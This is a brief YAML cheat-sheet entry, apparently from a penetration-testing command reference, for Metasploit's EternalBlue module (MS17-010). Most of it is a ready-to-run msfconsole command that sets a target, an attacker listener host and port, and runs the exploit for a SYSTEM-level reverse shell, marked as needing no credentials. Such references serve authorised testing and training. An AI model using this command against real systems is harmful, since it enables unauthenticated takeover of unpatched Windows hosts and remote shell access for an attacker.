---
description: |
  The ms17_010_eternalblue module weaponizes the EternalBlue SMBv1 vulnerability (MS17-010, CVE-2017-0144) to achieve unauthenticated remote code execution against unpatched Windows hosts. Once exploited, the module drops the configured payload (typically a Meterpreter reverse shell) and returns a session with SYSTEM privileges, making it one of the most reliable pre-authentication footholds against legacy Windows SMB servers.

  Command Reference:

  	Target IP: 10.10.10.1

  	Attacker IP: 10.10.10.5

  	Listener Port: 4444

command: |
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.1; set LHOST 10.10.10.5; set LPORT 4444; run"
items:
  - No_Creds
services:
  - SMB
OS:
  - Windows
phases:
  - Exploitation
references:
  - https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
  - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html
---
